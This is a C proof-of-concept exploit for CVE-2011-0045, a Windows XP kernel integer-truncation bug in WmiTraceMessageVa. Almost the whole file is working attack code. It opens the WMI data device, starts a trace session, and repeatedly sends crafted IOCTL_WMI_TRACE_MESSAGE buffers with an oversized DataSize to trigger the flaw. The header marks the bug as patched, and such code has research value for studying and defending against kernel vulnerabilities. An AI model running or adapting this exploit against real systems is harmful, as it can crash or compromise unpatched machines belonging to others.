/*
# Exploit Title: MS11-011(CVE-2011-0045): MS Windows XP WmiTraceMessageVa Integer Truncation Vulnerability PoC
# Date: 2011-03-01
# Author: Nikita Tarakanov (CISS Research Team)
# Software Link: 
# Version: prior to MS11-011
# Tested on: Win XP SP3
# CVE : CVE-2011-0045
# Status : Patched
# Binary Analysis: http://cissrt.blogspot.com/2011/02/cve-2011-0045-ms-windows-xp.html
*/




#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <strsafe.h>
#include <wmistr.h>
#include <evntrace.h>




#define WmiTraceMessageCode  40
#define WmiCreateUMLogger  84
#define WmiStartLoggerCode 32

#define IOCTL_WMI_TRACE_MESSAGE \
          CTL_CODE(FILE_DEVICE_UNKNOWN, WmiTraceMessageCode,
METHOD_NEITHER, FILE_WRITE_ACCESS)

/*
#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)

#define IOCTL_WMI_TRACE_MESSAGE \
          CTL_CODE(FILE_DEVICE_UNKNOWN, WmiTraceMessageCode,
METHOD_NEITHER, FILE_WRITE_ACCESS)

#define IOCTL_WMI_CREATE_UM_LOGGER CTL_CODE(FILE_DEVICE_UNKNOWN,
WmiCreateUMLogger, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_WMI_START_LOGGER \
          CTL_CODE(FILE_DEVICE_UNKNOWN, WmiStartLoggerCode,
METHOD_BUFFERED, FILE_ANY_ACCESS)



typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _STRING64 {
    USHORT   Length;
    USHORT   MaximumLength;
    ULONGLONG  Buffer;
} STRING64;
typedef STRING64 *PSTRING64;

typedef STRING64 UNICODE_STRING64;
typedef UNICODE_STRING64 *PUNICODE_STRING64;


//
// WNODE definition
typedef struct _WNODE_HEADER
{
    ULONG BufferSize;        // Size of entire buffer inclusive of this
ULONG
    ULONG ProviderId;    // Provider Id of driver returning this buffer
    union
    {
        ULONG64 HistoricalContext;  // Logger use
        struct
            {
            ULONG Version;           // Reserved
            ULONG Linkage;           // Linkage field reserved for WMI
        };
    };

    union
    {
        ULONG CountLost;         // Reserved
        HANDLE KernelHandle;     // Kernel handle for data block
        LARGE_INTEGER TimeStamp; // Timestamp as returned in units of 100ns
                                 // since 1/1/1601
    };
    GUID Guid;                  // Guid for data block returned with results
    ULONG ClientContext;
    ULONG Flags;             // Flags, see below
} WNODE_HEADER, *PWNODE_HEADER;

//
// Logger configuration and running statistics. This structure is used
// by WMI.DLL to convert to UNICODE_STRING
//
// begin_wmikm
typedef struct _WMI_LOGGER_INFORMATION {
    WNODE_HEADER Wnode;       // Had to do this since wmium.h comes later
//
// data provider by caller
    ULONG BufferSize;                   // buffer size for logging (in
kbytes)
    ULONG MinimumBuffers;               // minimum to preallocate
    ULONG MaximumBuffers;               // maximum buffers allowed
    ULONG MaximumFileSize;              // maximum logfile size (in MBytes)
    ULONG LogFileMode;                  // sequential, circular
    ULONG FlushTimer;                   // buffer flush timer, in seconds
    ULONG EnableFlags;                  // trace enable flags
    LONG  AgeLimit;                     // aging decay time, in minutes
    ULONG Wow;                          // TRUE if the logger started
under WOW64
    union {
        HANDLE  LogFileHandle;          // handle to logfile
        ULONG64 LogFileHandle64;
    };

// data returned to caller
// end_wmikm
    union {
// begin_wmikm
        ULONG NumberOfBuffers;          // no of buffers in use
// end_wmikm
        ULONG InstanceCount;            // Number of Provider Instances
    };
    union {
// begin_wmikm
        ULONG FreeBuffers;              // no of buffers free
// end_wmikm
        ULONG InstanceId;               // Current Provider's Id for
UmLogger
    };
    union {
// begin_wmikm
        ULONG EventsLost;               // event records lost
// end_wmikm
        ULONG NumberOfProcessors;       // Passed on to UmLogger
    };
// begin_wmikm
    ULONG BuffersWritten;               // no of buffers written to file
    ULONG LogBuffersLost;               // no of logfile write failures
    ULONG RealTimeBuffersLost;          // no of rt delivery failures
    union {
        HANDLE  LoggerThreadId;         // thread id of Logger
        ULONG64 LoggerThreadId64;       // thread is of Logger
    };
    union {
        UNICODE_STRING LogFileName;     // used only in WIN64
        UNICODE_STRING64 LogFileName64; // Logfile name: only in WIN32
    };

// mandatory data provided by caller
    union {
        UNICODE_STRING LoggerName;      // Logger instance name in WIN64
        UNICODE_STRING64 LoggerName64;  // Logger Instance name in WIN32
    };

// private
    union {
        PVOID   Checksum;
        ULONG64 Checksum64;
    };
    union {
        PVOID   LoggerExtension;
        ULONG64 LoggerExtension64;
    };
} WMI_LOGGER_INFORMATION, *PWMI_LOGGER_INFORMATION;

*/

typedef struct _WMI_TRACE_MESSAGE_PACKET {  // must be ULONG!!
    USHORT  MessageNumber;                  // The message Number, index
of messages by GUID
                                            // Or ComponentID
    USHORT  OptionFlags ;                   // Flags associated with the
message
} WMI_TRACE_MESSAGE_PACKET, *PWMI_TRACE_MESSAGE_PACKET;

typedef struct _MESSAGE_TRACE_HEADER {
    union {
        ULONG       Marker;
        struct {
            USHORT  Size;                           // Total Size of the
message including header
            UCHAR   Reserved;               // Unused and reserved
            UCHAR   Version;                // The message structure
type (TRACE_MESSAGE_FLAG)
        };
    };
    union {
        ULONG            Header;            // both sizes must be the same!
        WMI_TRACE_MESSAGE_PACKET Packet;
    };
} MESSAGE_TRACE_HEADER, *PMESSAGE_TRACE_HEADER;

typedef struct _MESSAGE_TRACE {
    MESSAGE_TRACE_HEADER    MessageHeader ;
    UCHAR                   Data ;
} MESSAGE_TRACE, *PMESSAGE_TRACE ;

//
// Structure used to pass user log messages to the kernel
//
typedef struct _MESSAGE_TRACE_USER {
    MESSAGE_TRACE_HEADER    MessageHeader ;
    ULONG                   MessageFlags  ;
    ULONG64                 LoggerHandle ;
    GUID                    MessageGuid ;
    ULONG                   DataSize ;
    UCHAR                   Data ;
} MESSAGE_TRACE_USER, *PMESSAGE_TRACE_USER ;

/*


typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService;  // Points to type
SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef union
{
    HANDLE  Handle;
    ULONG64 Handle64;
    ULONG32 Handle32;
} HANDLE3264, *PHANDLE3264;

typedef struct
{
    IN  POBJECT_ATTRIBUTES ObjectAttributes;
    IN  GUID ControlGuid;
    OUT HANDLE3264 ReplyHandle;
    OUT ULONG ReplyCount;
} WMICREATEUMLOGGER, *PWMICREATEUMLOGGER;

*/

//#define LOGFILE_PATH L"<FULLPATHTOLOGFILE.etl>"
#define LOGFILE_PATH L"test.etl"
//#define LOGSESSION_NAME L"My Event Trace Session"
#define LOGSESSION_NAME L"test"

// GUID that identifies your trace session.
// Remember to create your own session GUID.

// {94BE0BF2-885F-4972-8461-A7D83B53F1AD}
static const GUID SessionGuid =
{ 0x94be0bf2, 0x885f, 0x4972, { 0x84, 0x61, 0xa7, 0xd8, 0x3b, 0x53,
0xf1, 0xad } };

// GUID that identifies the provider that you want
// to enable to your session.

// {7C214FB1-9CAC-4b8d-BAED-7BF48BF63BB3}
static const GUID ProviderGuid =
{ 0x7c214fb1, 0x9cac, 0x4b8d, { 0xba, 0xed, 0x7b, 0xf4, 0x8b, 0xf6,
0x3b, 0xb3 } };

int trigger(HANDLE hDevice);
int start_usermode_logger(HANDLE hDevice);
int start_logger(HANDLE hDevice);
HANDLE open_device();

int main(int argc, char **argv)
{
    HANDLE hDevice;
    if((hDevice = open_device()) == INVALID_HANDLE_VALUE){
        printf("open_device failed!\n");
        return 0;
    }
    
    if(!start_usermode_logger(hDevice)){
        printf("start_usermode_logger failed!\n");
        return 0;
    }
    
    /*
    if(!start_logger(hDevice)){
        printf("start_logger failed!\n");
        return 0;
    }
    */
    trigger(hDevice);
    return 0;
}

HANDLE open_device()
{
    char deviceName[] = "\\\\.\\WMIDataDevice";
    HANDLE hDevice;
    if ( (hDevice = CreateFileA(deviceName,
                          GENERIC_READ|GENERIC_WRITE,
                          //0,
                          0,
                          0,
                          OPEN_EXISTING,
                          0,
                          NULL) ) != INVALID_HANDLE_VALUE )
    {
        printf("Device  succesfully opened!\n");
        return hDevice;
    }
    else
    {
        printf("Error: Error opening device at NULL premission\n");
        return INVALID_HANDLE_VALUE;
    }
}

int start_usermode_logger(HANDLE hDevice)
{
    ULONG status = ERROR_SUCCESS;
    TRACEHANDLE SessionHandle = 0;
    EVENT_TRACE_PROPERTIES* pSessionProperties = NULL;
    ULONG BufferSize = 0;
    BOOL TraceOn = TRUE;

    // Allocate memory for the session properties. The memory must
    // be large enough to include the log file name and session name,
    // which get appended to the end of the session properties structure.
    
    BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(LOGFILE_PATH) +
sizeof(LOGSESSION_NAME);
    pSessionProperties = (EVENT_TRACE_PROPERTIES*) malloc(BufferSize);    
    if (NULL == pSessionProperties)
    {
        wprintf(L"Unable to allocate %d bytes for properties
structure.\n", BufferSize);
        return 0;
    }
    
    // Set the session properties. You only append the log file name
    // to the properties structure; the StartTrace function appends
    // the session name for you.

    ZeroMemory(pSessionProperties, BufferSize);
    pSessionProperties->Wnode.BufferSize = BufferSize;
    pSessionProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    pSessionProperties->Wnode.ClientContext = 1; //QPC clock resolution
    pSessionProperties->Wnode.Guid = SessionGuid;
    pSessionProperties->LogFileMode = EVENT_TRACE_FILE_MODE_CIRCULAR |
EVENT_TRACE_USE_PAGED_MEMORY;
    pSessionProperties->MaximumFileSize = 5;  // 5 MB
    pSessionProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    pSessionProperties->LogFileNameOffset =
sizeof(EVENT_TRACE_PROPERTIES) + sizeof(LOGSESSION_NAME);
    StringCbCopy((LPWSTR)((char*)pSessionProperties +
pSessionProperties->LogFileNameOffset), sizeof(LOGFILE_PATH), LOGFILE_PATH);

    // Create the trace session.

    status = StartTrace((PTRACEHANDLE)&SessionHandle, LOGSESSION_NAME,
pSessionProperties);
    if (ERROR_SUCCESS != status)
    {
        wprintf(L"StartTrace() failed with %lu\n", status);
        return 0;
    }

    // Enable the providers that you want to log events to your session.

    status = EnableTrace(
        TraceOn,                 // TRUE enables the provider
        0,                       // No enable flags
        TRACE_LEVEL_INFORMATION, // Enable informational, warning, error
and critical events
        (LPCGUID)&ProviderGuid,  // Provider to enable
        SessionHandle            // Session handle from StartTrace
        );

    if (ERROR_SUCCESS != status)
    {
        wprintf(L"EnableTrace() failed with %lu\n", status);
        TraceOn = FALSE;
        return 0;
    }

    wprintf(L"Run the provider application. Then hit any key to stop the
session.\n");
    return 1;
}

int trigger(HANDLE hDevice)
{

    DWORD    cb, inlen, outlen;
    char        *buff, *buff_out = NULL;

    DWORD result = 0;
    unsigned char str[] = "fuckdata";

    MESSAGE_TRACE_USER Message;

    Message.MessageHeader.Marker = 0xBEBEBEBE;
    Message.MessageHeader.Header = 0xEFEFEFEF;

    Message.MessageFlags = 0xC0C0DEDE;

    //Message.LoggerHandle = 0xC0DEC0DEDEADDEAD;
    //Message.LoggerHandle = 0xC0DEC0DE12340001;//last WORD should be in
1 < n < 40
    Message.LoggerHandle = 0xC0DEC0DE12340000;//last WORD should be in 1
< n < 40

    Message.MessageGuid.Data1 = 0xC0DEDEAD;
    Message.MessageGuid.Data2 = 0xDEC0;
    Message.MessageGuid.Data3 = 0xDEDE;
    memcpy(Message.MessageGuid.Data4, str, 8);

    //Message.DataSize = 0xDEADBEEF;
    //Message.DataSize = 0x0000FFFE;//in fixed versioon should be < 0x1FD0
    Message.DataSize = 0x00010FF0;//in fixed versioon should be < 0x1FD0
    Message.Data = '0';

    //DWORD ioctl = 0x2280A3;

    buff_out = (char*)malloc(0x2000);
    if(!buff_out){
      printf("malloc failed");
      return 0;
    }
    memset(buff_out, 0x0, 0x2000);

    cb = 0;
    buff = (char*)malloc(0x20000);
    if(!buff){
      printf("malloc failed");
      return 0;
    }
    memset(buff, 'A', 0x20000-1);



    outlen = 0x0;
    inlen = 0x15000;

    memcpy(buff, &Message, 0x30);
    //result = DeviceIoControl(hDevice, IOCTL_WMI_TRACE_MESSAGE,
(LPVOID)&Message, inlen, (LPVOID)buff_out, outlen, &cb, NULL);
    for(int i =0; i< 0x40; i++){
        Message.LoggerHandle++;
        memset(buff, 'A', 0x20000-1);
        memcpy(buff, &Message, 0x30);

        result = DeviceIoControl(hDevice, IOCTL_WMI_TRACE_MESSAGE,
(LPVOID)buff, inlen, (LPVOID)buff_out, outlen, &cb, NULL);
        printf("ioctl = 0x%08X, id = %d, result = %d\n",
IOCTL_WMI_TRACE_MESSAGE, i, result);
    }    
    printf("done!");
    free(buff);
}
